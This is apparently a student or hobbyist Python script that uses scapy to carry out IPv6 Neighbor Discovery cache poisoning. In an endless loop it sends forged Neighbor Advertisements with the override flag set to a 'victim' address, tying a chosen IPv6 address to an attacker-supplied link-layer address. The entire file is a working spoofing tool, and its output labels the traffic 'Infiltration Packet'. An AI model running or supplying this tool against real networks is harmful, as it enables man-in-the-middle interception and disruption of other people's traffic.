#!/usr/bin/python

# Jack Cardwell
# January 29, 2018

import sys
from scapy.all import *
from time import sleep

# the main function
def handleSniff():
    # handle argument parsing and don't continue unless there are some arguments given
    if len(sys.argv) < 4:
        print("Error: Please enter two command line options.")
        print("Usage: ./neighborDiscovery.py [Victim Address][Global Address] [LL Address]")
        exit(2)


    # get the inputs from the command line
    args = sys.argv

    victim = args[1]
    targetAddress = args[2]
    targetLL = args[3]

    response = IPv6()
    response.version = 6
    response.nh = 58
    response.src = targetAddress    # the address to poison
    response.dst = victim        # use the mulitcast address to poison all ndp entries

    # the Neighbor Advertisement portion
    respICMPv6 = ICMPv6ND_NA()
    respICMPv6.type = 136
    respICMPv6.code = 0
    respICMPv6.R = 0
    respICMPv6.S = 0
    respICMPv6.O = 1    # set the override flag so that all packets are stored here
    respICMPv6.tgt = targetAddress

    # create the optional header
    opt = ICMPv6NDOptDstLLAddr(lladdr=targetLL)


    while True:

        send(response/respICMPv6/opt)
        print("Sent Infiltration Packet. Will send another in 5 seconds")
        sleep(5)

handleSniff()
